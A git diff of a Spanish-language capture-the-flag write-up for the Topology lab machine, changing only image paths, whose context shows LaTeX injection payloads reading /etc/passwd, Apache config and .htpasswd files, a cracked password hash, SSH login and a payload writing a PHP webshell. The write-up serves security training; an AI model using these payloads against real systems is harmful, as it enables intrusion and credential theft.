@@ -226,7 +226,7 @@ Los . htaccess se utilizan para indicar al servidor web que se comporte de una d
 htpasswd es un archivo de texto que se usa para guardar los nombres de usuario y las contraseñas para la autenticación básica del Servidor HTTP Apache. El nombre del fichero se da en el fichero de configuración .
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/imagen (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Initial Access
 
@@ -234,13 +234,13 @@ htpasswd es un archivo de texto que se usa para guardar los nombres de usuario y
 
 Volveremos a la página de http://latex.topology.htb y probaremos de revisar si es vulnerable a `LaTeX Injection` el campo donde nos permite inyectar código `LaTeX`.
 
-<figure><img src="../../.gitbook/assets/imagen (6).png" alt="" width="519"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (6) (1).png" alt="" width="519"><figcaption></figcaption></figure>
 
 Interceptaremos la solicitud con `BurpSuite`, y comprobamos que la solicitud se tramita a través del método `GET`. Por otro lado, se verifica que la variable `eqn` es dónde podemos introducir código `LaTeX`.
 
 En este ejemplo básico, introduciremos `Gzzcoo` y al enviar la solicitud, en la respuesta por parte del servidor se nos genera un PDF con el código `LaTeX`.
 
-<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Reading Files with LaTeX Injection
 
@@ -272,7 +272,7 @@ Al intentar listar todo el contenido de `/etc/passwd`a través de la siguiente i
 \closein\file
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Probamos de intentar ejecutar  el comando `id` mediante la siguiente inyección `LaTeX` para intentar obtener un **RCE**. pero tampoco obtuvimos el resultado esperado.
 
@@ -281,7 +281,7 @@ Probamos de intentar ejecutar  el comando `id` mediante la siguiente inyección 
 \input{output}
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 En la siguiente página web,s e nos menciona un paquete de `code listing` en donde podemos importar código desde un archivo.
 
@@ -293,7 +293,7 @@ En este caso, tratamos de incluir una imagen del contenido del archivo `/etc/pas
 \lstinputlisting{/etc/passwd}
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 Para explotar la vulnerabilidad de **LaTeX Injection**, necesitamos inyectar código malicioso en un contexto donde LaTeX lo interprete y ejecute.
 
@@ -311,7 +311,7 @@ Por lo tanto, tenemos una manera de listar el contenido de archivos arbitrarios 
 $\lstinputlisting{/etc/passwd}$
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Information Leakage
 
@@ -323,7 +323,7 @@ Por lo tanto, decidimos primero revisar la configuración de las páginas web de
 $\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 En el resultado obtenido, se nos mostró la configuración de las diferentes páginas web que llegamos a enumerar anteriormente.
 
@@ -331,15 +331,15 @@ Revisamos que la configuración de `dev.topology.htb` se encuentra en `/var/www/
 
 {% tabs %}
 {% tab title="topology.htb" %}
-<figure><img src="../../.gitbook/assets/imagen (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (14) (1).png" alt=""><figcaption></figcaption></figure>
 {% endtab %}
 
 {% tab title="stats.topology.htb" %}
-<figure><img src="../../.gitbook/assets/imagen (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (15) (1).png" alt=""><figcaption></figcaption></figure>
 {% endtab %}
 
 {% tab title="dev.topology.htb" %}
-<figure><img src="../../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (16) (1).png" alt=""><figcaption></figcaption></figure>
 {% endtab %}
 {% endtabs %}
 
@@ -351,7 +351,7 @@ Tal y como mencionábamos anteriormente, se estaba utilizando un `Basic Auth`par
 $\lstinputlisting{/var/www/dev/.htaccess}$
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 Decidimos listar el contenido del `.htpasswd` en el resultado obtenido, se nos muestra las credenciales del usuario `vdaisley` en formato hash, probablemente `Apache MD5`.
 
@@ -359,7 +359,7 @@ Decidimos listar el contenido del `.htpasswd` en el resultado obtenido, se nos m
 $\lstinputlisting{/var/www/dev/.htpasswd}$
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 Verificamos que el tipo de hash encontrado es `Apache MD5`. A través de `hashcat`, finalmente logramos crackear el hash y obtener las credenciales en texto plano.
 
@@ -385,7 +385,7 @@ $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20
 
 Probamos de autenticarnos con las credenciales encontradas en [http://dev.topology.htb](http://dev.topology.htb), logramos acceder a la página web, pero no obtenemos información interesante que nos pueda servir.
 
-<figure><img src="../../.gitbook/assets/imagen (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 Probamos de autenticarnos al `SSH` con las credenciales del usuario `vdaisley`, finalmente logramos el acceso remoto a la máquina y visualizar la flag de **user.txt**.
 
@@ -424,11 +424,11 @@ En el siguiente ejemplo, creamos un archivo llamado `gzzcoo.php` que contenía u
 \newwrite\outfile\openout\outfile=gzzcoo.php\^^77rite\outfile{<?php system($_REQUEST['cmd']); ?>}\closeout\outfile
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (21) (1).png" alt=""><figcaption></figcaption></figure>
 
 Este archivo al parecer, es subido en [http://latex.topology.htb/tempfiles/](http://latex.topology.htb/tempfiles/), en el cual comprobamos el archivo creado.
 
-<figure><img src="../../.gitbook/assets/imagen (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 Probamos de utilizar la **webshell** subida, y se nos muestra la posibilidad de ejecutar comandos arbitrarios en el sistema objetivo.
 
